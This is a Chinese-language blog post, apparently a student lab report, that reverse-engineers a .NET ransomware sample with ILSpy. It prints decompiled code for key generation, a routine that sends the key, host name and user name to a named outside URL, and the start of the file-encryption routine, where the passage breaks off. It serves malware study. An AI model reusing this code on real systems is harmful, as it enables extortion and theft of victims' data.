@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/user.png">
+  <link rel="icon" href="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/user.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Re1ca1g">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 实验：勒索病毒程序分析1. 实验目的： 掌握.Net程序逆向分析方法  通过真实案例了勒索病毒程序的一般工作原理和关键技术   2. 实验环境：操作系统：Windows 7&#x2F;8&#x2F;10 实验对象：某勒索软件程序 实验软件：Detect It Easy，ILSpy 3. 实验内容：3.1 实验背景勒索型恶意代码是一种以勒索为目的的恶意软件——黑客使用技术手段劫持用户设备">
+<meta property="og:type" content="article">
+<meta property="og:title" content="勒索病毒程序分析">
+<meta property="og:url" content="http://example.com/2024/10/24/111/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Re1ca1gの小破站">
+<meta property="og:description" content="[TOC] 实验：勒索病毒程序分析1. 实验目的： 掌握.Net程序逆向分析方法  通过真实案例了勒索病毒程序的一般工作原理和关键技术   2. 实验环境：操作系统：Windows 7&#x2F;8&#x2F;10 实验对象：某勒索软件程序 实验软件：Detect It Easy，ILSpy 3. 实验内容：3.1 实验背景勒索型恶意代码是一种以勒索为目的的恶意软件——黑客使用技术手段劫持用户设备">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wxjb.jspi.cn/g/query/265d14b0-c3fa-4d4a-9940-2e3f24cf84eb">
+<meta property="og:image" content="http://wxjb.jspi.cn/g/query/6d941f5d-fce5-4aff-bbff-e16df2372ced">
+<meta property="og:image" content="http://wxjb.jspi.cn/g/query/3aa80771-cd8b-4451-8d71-17f561fc46c0">
+<meta property="og:image" content="http://wxjb.jspi.cn/g/query/39b15c96-5cf0-4d2c-81b4-7df36416c0b8">
+<meta property="og:image" content="http://wxjb.jspi.cn/g/query/fe53b8fd-4856-4bd3-a3aa-662e542cea5c">
+<meta property="article:published_time" content="2024-10-24T06:23:04.000Z">
+<meta property="article:modified_time" content="2024-10-29T08:54:32.331Z">
+<meta property="article:author" content="Re1ca1g">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://wxjb.jspi.cn/g/query/265d14b0-c3fa-4d4a-9940-2e3f24cf84eb">
+  
+  
+  
+  <title>勒索病毒程序分析 - Re1ca1gの小破站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>re1ca1g·blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('http://www.98qy.com/sjbz/api.php') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.6)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="勒索病毒程序分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-24 14:23" pubdate>
+          2024年10月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">勒索病毒程序分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h1 id="实验：勒索病毒程序分析"><a href="#实验：勒索病毒程序分析" class="headerlink" title="实验：勒索病毒程序分析"></a>实验：勒索病毒程序分析</h1><h2 id="1-实验目的："><a href="#1-实验目的：" class="headerlink" title="1. 实验目的："></a>1. 实验目的：</h2><ol>
+<li><p>掌握.Net程序逆向分析方法</p>
+</li>
+<li><p>通过真实案例了勒索病毒程序的一般工作原理和关键技术</p>
+</li>
+</ol>
+<h2 id="2-实验环境："><a href="#2-实验环境：" class="headerlink" title="2. 实验环境："></a>2. 实验环境：</h2><p>操作系统：Windows 7&#x2F;8&#x2F;10</p>
+<p>实验对象：某勒索软件程序</p>
+<p>实验软件：Detect It Easy，ILSpy</p>
+<h2 id="3-实验内容："><a href="#3-实验内容：" class="headerlink" title="3. 实验内容："></a>3. 实验内容：</h2><h3 id="3-1-实验背景"><a href="#3-1-实验背景" class="headerlink" title="3.1 实验背景"></a>3.1 实验背景</h3><p>勒索型恶意代码是一种以勒索为目的的恶意软件——黑客使用技术手段劫持用户设备或数据资产，并以此为条件向用户勒索钱财的一种恶意攻击手段。</p>
+<p>典型的勒索型恶意代码一般会通过绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户骚扰恐吓，最终达到勒索钱财的目的。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件，赎金形式包据真实货币、比特币或其他虚拟货币等。</p>
+<h3 id="3-2-实验内容概述"><a href="#3-2-实验内容概述" class="headerlink" title="3.2 实验内容概述"></a>3.2 实验内容概述</h3><p>待分析样本文件是某款勒索软件活体样本，具有执行和感染的风险，请同学们在实验分析时候做好实验环境的隔离措施。</p>
+<p>本次实验内容是通过使用Detect It Easy ，dnSpy和iLSpy等分析软件，对分析样本进行分析，通过对反编译工具还原C#语言编写的勒索软件，对其中的核心代码进行阅读和分析，了解其功能。通过实际勒索软件的分析进一步加深相关理论和概念的理解。 </p>
+<h2 id="4-实验步骤："><a href="#4-实验步骤：" class="headerlink" title="4. 实验步骤："></a>4. 实验步骤：</h2><h3 id="4-1-样本文件类型及其基本信息搜集。"><a href="#4-1-样本文件类型及其基本信息搜集。" class="headerlink" title="4.1 样本文件类型及其基本信息搜集。"></a>4.1 样本文件类型及其基本信息搜集。</h3><p>在进一步对样本程序分析前，必须首先确定样本文件的一些基本信息，如文件类型，可执行类别，是Win32 PE可执行文件还是dot net可执行文件，或者是java语言编写的jar程序包。此外对文件编译的编译器的确定也有利于下一步的分析工具的选择，因此分析的第一步通常是确定文件的相关信息。</p>
+<p>目前使用比较多的是Detect It Easy工具，该工具能获得大多数分析工作中需要的基本信息。</p>
+<p><img src="http://wxjb.jspi.cn/g/query/265d14b0-c3fa-4d4a-9940-2e3f24cf84eb" srcset="/img/loading.gif" lazyload alt="图 1 Detect It Easy分析"></p>
+<center>图 1 Detect It Easy分析</center>
+
+<p>如图 1所示的Die软件的界面中显示了本次实验需要分析的样本文件的基本信息，其中可以从程序的主界面直观的观察到样本程序是.net可执行程序。</p>
+<p>在.NET环境中的字节代码程序，这使得采用ILSpy等逆向分析工具能方便的还原显示开发过程的原始代码，这为人工分析恶意代码提供了一定的便利。</p>
+<h3 id="4-2-静态分析"><a href="#4-2-静态分析" class="headerlink" title="4.2 静态分析"></a>4.2 静态分析</h3><p>样本文件采用C#语言开发，因此通常会首先尝试使用ILSpy或.NET Reflector等工具对样本文件进行源码基本的逆向分析。使用反编译工具直接从可执行文件逆向获得开发编写的程序语言代码，并进行分析的方式，通常称为静态分析，通过对源代码或者伪代码进行分析，可以准确的了解程序功能。</p>
+<p>静态分析的主要优点是在病毒或恶意代码不执行的条件下，能对其进行分析，但是其不足之处也是显而易见的，就是对于比较复杂的程序人工分析的工作量较大，程序分支结构复杂而无法人工分析。</p>
+<p><img src="http://wxjb.jspi.cn/g/query/6d941f5d-fce5-4aff-bbff-e16df2372ced" srcset="/img/loading.gif" lazyload alt="图 2 使用ILSpy查看.NET程序集文件"></p>
+<center>图 2 使用ILSpy查看.NET程序集文件</center>
+
+<p>ILSpy软件的使用方式比较简单，打开软件后，直接将需要分析的程序集（exe文件）拖进程序窗口中，在左侧的导航窗格中找到，逐级展开其中的树形结构，单击需要查看的节点，在窗口右侧就会显示出对应的代码，如图 2是使用ILSpy打开实验样本程序的效果。</p>
+<p><img src="http://wxjb.jspi.cn/g/query/3aa80771-cd8b-4451-8d71-17f561fc46c0" srcset="/img/loading.gif" lazyload alt="图 3 样本程序结构树形显示（ILSpy左侧导航窗格）"></p>
+<center>图 3 样本程序结构树形显示（ILSpy左侧导航窗格）</center>
+
+<p>打开样本分析程序后，可以看到程序资源文件和blocky命名空间，其中包含了Form1和Program两个类的代码。如图 3中所示。这些都符合常规WinForm程序的代码结构，可以初步判断是一个具有单一窗口的WinForm应用程序。</p>
+<p>单击Program类图标，可以在右侧的代码窗口中看到代码如下。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> &#123;<br><span class="hljs-number">02</span>     [STAThread]<br><span class="hljs-number">03</span>     <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span> &#123;<br><span class="hljs-number">04</span>         Application.EnableVisualStyles();<br><span class="hljs-number">05</span>         Application.SetCompatibleTextRenderingDefault(defaultValue: <span class="hljs-literal">false</span>);<br><span class="hljs-number">06</span>         Application.Run(<span class="hljs-keyword">new</span> Form1());  <span class="hljs-comment">// &lt;--这里程序启动Form1窗口</span><br><span class="hljs-number">07</span>     &#125;<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码中，可以确定程序启动后的主窗口程序是Form1，单击Form1图标继续查看相关代码。</p>
+<p><img src="http://wxjb.jspi.cn/g/query/39b15c96-5cf0-4d2c-81b4-7df36416c0b8" srcset="/img/loading.gif" lazyload alt="图 4 Form1代码"></p>
+<center>图 4 Form1代码</center>
+
+<p>这里对Windows Form程序代码做以下简单说明：</p>
+<p>（1）Form1及其成员变量。</p>
+<p>Form1是从Form类继承而来的，Form类是Windows Form程序中标准窗口类，窗口中的一些控件，例如Button，PictureBox等都可以定义成类中的成员变量，可以在类中的方法中调用。</p>
+<p>（2）Form1的构造函数及成员方法</p>
+<p>在面向对象程序设计语言中，通常一个类会有和其类目同名的构造函数或构造方法，这里Form1()就是Form1类的构造函数，当新建一个Form1对象时，构造函数将会自动执行。展开Form1()构造函数可以发现，其代码是调用了InitializeComponent方法，代码如下：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitializeComponent</span>()</span> &#123;<br><span class="hljs-number">02</span>     pictureBox1 = <span class="hljs-keyword">new</span> System.Windows.Forms.PictureBox();<br><span class="hljs-number">03</span>     ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();<br><span class="hljs-number">04</span>     SuspendLayout();<br><span class="hljs-number">05</span>     pictureBox1.Location = <span class="hljs-keyword">new</span> System.Drawing.Point(<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-number">06</span>     pictureBox1.Name = <span class="hljs-string">&quot;pictureBox1&quot;</span>;<br><span class="hljs-number">07</span>     pictureBox1.Size = <span class="hljs-keyword">new</span> System.Drawing.Size(<span class="hljs-number">805</span>, <span class="hljs-number">450</span>);<br><span class="hljs-number">08</span>     pictureBox1.TabIndex = <span class="hljs-number">0</span>;<br><span class="hljs-number">09</span>     pictureBox1.TabStop = <span class="hljs-literal">false</span>;<br><span class="hljs-number">10</span>     <span class="hljs-keyword">base</span>.AutoScaleDimensions = <span class="hljs-keyword">new</span> System.Drawing.SizeF(<span class="hljs-number">6f</span>, <span class="hljs-number">13f</span>);<br><span class="hljs-number">11</span>     <span class="hljs-keyword">base</span>.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;<br><span class="hljs-number">12</span>     <span class="hljs-keyword">base</span>.ClientSize = <span class="hljs-keyword">new</span> System.Drawing.Size(<span class="hljs-number">800</span>, <span class="hljs-number">450</span>);<br><span class="hljs-number">13</span>     <span class="hljs-keyword">base</span>.Controls.Add(pictureBox1);<br><span class="hljs-number">14</span>     <span class="hljs-keyword">base</span>.Name = <span class="hljs-string">&quot;Form1&quot;</span>;<br><span class="hljs-number">15</span>     Text = <span class="hljs-string">&quot;Form1&quot;</span>;<br><span class="hljs-number">16</span>     <span class="hljs-keyword">base</span>.Load += <span class="hljs-keyword">new</span> System.EventHandler(Form1_Load);<br><span class="hljs-number">17</span>     ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();<br><span class="hljs-number">18</span>     ResumeLayout(<span class="hljs-literal">false</span>);<br><span class="hljs-number">19</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码中主要是初始化了一个图片控件，其中第16行代码是增加了一个Load事件绑定，表面当窗体加载完毕后的执行代码。</p>
+<p>在如图 3的代码树窗体中，单击Form1_Load，可以查看到如下代码。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-keyword">using</span> System;<br><span class="hljs-number">02</span> <br><span class="hljs-number">03</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Form1_Load</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span> &#123;<br><span class="hljs-number">04</span>     <span class="hljs-keyword">base</span>.Opacity = <span class="hljs-number">0.0</span>;<br><span class="hljs-number">05</span>     <span class="hljs-keyword">base</span>.ShowInTaskbar = <span class="hljs-literal">false</span>;<br><span class="hljs-number">06</span>     startAction();  <span class="hljs-comment">// &lt;--窗体加载后将自动执行</span><br><span class="hljs-number">07</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码中，主要是加载了startAction方法，使用鼠标单击startAction方法，就可以直接查看其中代码。 </p>
+<h3 id="4-3-主体代码分析"><a href="#4-3-主体代码分析" class="headerlink" title="4.3 主体代码分析"></a>4.3 主体代码分析</h3><p>startAction方法是恶意代码行为调用的父方法，具有破坏的恶意代码均由其调用，使用ILSpy可以查看代码如下：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">startAction</span>()</span> &#123;<br><span class="hljs-number">02</span>     MoveVirus();<br><span class="hljs-number">03</span>     <span class="hljs-built_in">string</span> password = CreatePassword(<span class="hljs-number">15</span>);<br><span class="hljs-number">04</span>     Directory_Settings_Sending(password);<br><span class="hljs-number">05</span>     messageCreator();<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> path = userDir + userName + <span class="hljs-string">&quot;\\ransom.bmp&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">bool</span> flag;<br><span class="hljs-number">08</span>     <span class="hljs-keyword">do</span> &#123;<br><span class="hljs-number">09</span>         flag = CheckForInternetConnection();<br><span class="hljs-number">10</span>         <span class="hljs-keyword">if</span> (flag) &#123;<br><span class="hljs-number">11</span>             CreateWallpaper(path);<br><span class="hljs-number">12</span>             SendPassword(password);<br><span class="hljs-number">13</span>         &#125;<br><span class="hljs-number">14</span>     &#125; <span class="hljs-keyword">while</span> (!flag);<br><span class="hljs-number">15</span>     password = <span class="hljs-literal">null</span>;<br><span class="hljs-number">16</span>     Application.Exit();<br><span class="hljs-number">17</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>startAction方法被程序的初始化代码调用后，startAction中分别调用CreateWallpaper，MoveVirus，SendPassword，Directory_Settinys_Sending和CreatePassword等方法，实现对用户文件的加密，显示勒索信息，发送加密密码等行为，其主要方法之间调用关系如图 5所示。</p>
+<p><img src="http://wxjb.jspi.cn/g/query/fe53b8fd-4856-4bd3-a3aa-662e542cea5c" srcset="/img/loading.gif" lazyload alt="图 5 核心代码调用关系图"></p>
+<center>图 5 核心代码调用关系图</center>
+
+<p>从startAction代码和调用关系图中，可以直观的推测恶意代码的整体思路如下：</p>
+<ul>
+<li><p>病毒代码进行自我复制保存</p>
+</li>
+<li><p>病毒创建加密使用的密钥</p>
+</li>
+<li><p>病毒使用创建的密钥对主机中的文件进行加密</p>
+</li>
+<li><p>检测互联网状态，并在联网状态，将加密的密钥发送出去</p>
+</li>
+<li><p>创建勒索信息图片并显示给用户进行勒索</p>
+</li>
+</ul>
+<p>下面分别对其关键代码进行分析，确认以上的功能</p>
+<h4 id="4-3-1-创建密码"><a href="#4-3-1-创建密码" class="headerlink" title="4.3.1 创建密码"></a>4.3.1 创建密码</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">CreatePassword</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> length</span>)</span> &#123;<br><span class="hljs-number">02</span>     StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-number">03</span>     Random random = <span class="hljs-keyword">new</span> Random();<br><span class="hljs-number">04</span>     <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span> &lt; length--) &#123;<br><span class="hljs-number">05</span>         stringBuilder.Append(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()&quot;</span>[random.Next(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()&quot;</span>.Length)]);<br><span class="hljs-number">06</span>     &#125;<br><span class="hljs-number">07</span>     <span class="hljs-keyword">return</span> stringBuilder.ToString();<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码使用给定的字母表，通过系统的random随机函数，构造出一个长度为length的随机密码。</p>
+<h4 id="4-3-2-发送密码"><a href="#4-3-2-发送密码" class="headerlink" title="4.3.2 发送密码"></a>4.3.2 发送密码</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPassword</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;?computer_name=&quot;</span> + computerName + <span class="hljs-string">&quot;&amp;userName=&quot;</span> + userName + <span class="hljs-string">&quot;&amp;password=&quot;</span> + password + <span class="hljs-string">&quot;&amp;allow=ransom&quot;</span>;<br><span class="hljs-number">04</span>         <span class="hljs-built_in">string</span> address = targetURL + str;<br><span class="hljs-number">05</span>         <span class="hljs-built_in">string</span> text = <span class="hljs-keyword">new</span> WebClient().DownloadString(address);<br><span class="hljs-number">06</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">07</span>     &#125;<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码中，使用了WebClinet的DownloadSting方法想给定的互联网地址发送了GET请求，将密码，主机名和用户密码发送给网址<a target="_blank" rel="noopener" href="http://rose-flowers.epizy.com/write.php">http://rose-flowers.epizy.com/write.php</a></p>
+<p>这里请大家思考，为什么除了发送密码，恶意代码还发送了主机名和用户名等信息。</p>
+<h4 id="4-3-3-目录扫描加密"><a href="#4-3-3-目录扫描加密" class="headerlink" title="4.3.3 目录扫描加密"></a>4.3.3 目录扫描加密</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Directory_Settings_Sending</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Users\\&quot;</span>;<br><span class="hljs-number">03</span>     <span class="hljs-built_in">string</span> location = userDir + str + userName + <span class="hljs-string">&quot;\\Desktop&quot;</span>;<br><span class="hljs-number">04</span>     <span class="hljs-built_in">string</span> location2 = userDir + str + userName + <span class="hljs-string">&quot;\\Links&quot;</span>;<br><span class="hljs-number">05</span>     <span class="hljs-built_in">string</span> location3 = userDir + str + userName + <span class="hljs-string">&quot;\\Contacts&quot;</span>;<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> location4 = userDir + str + userName + <span class="hljs-string">&quot;\\Desktop&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">string</span> location5 = userDir + str + userName + <span class="hljs-string">&quot;\\Documents&quot;</span>;<br><span class="hljs-number">08</span>     <span class="hljs-built_in">string</span> location6 = userDir + str + userName + <span class="hljs-string">&quot;\\Downloads&quot;</span>;<br><span 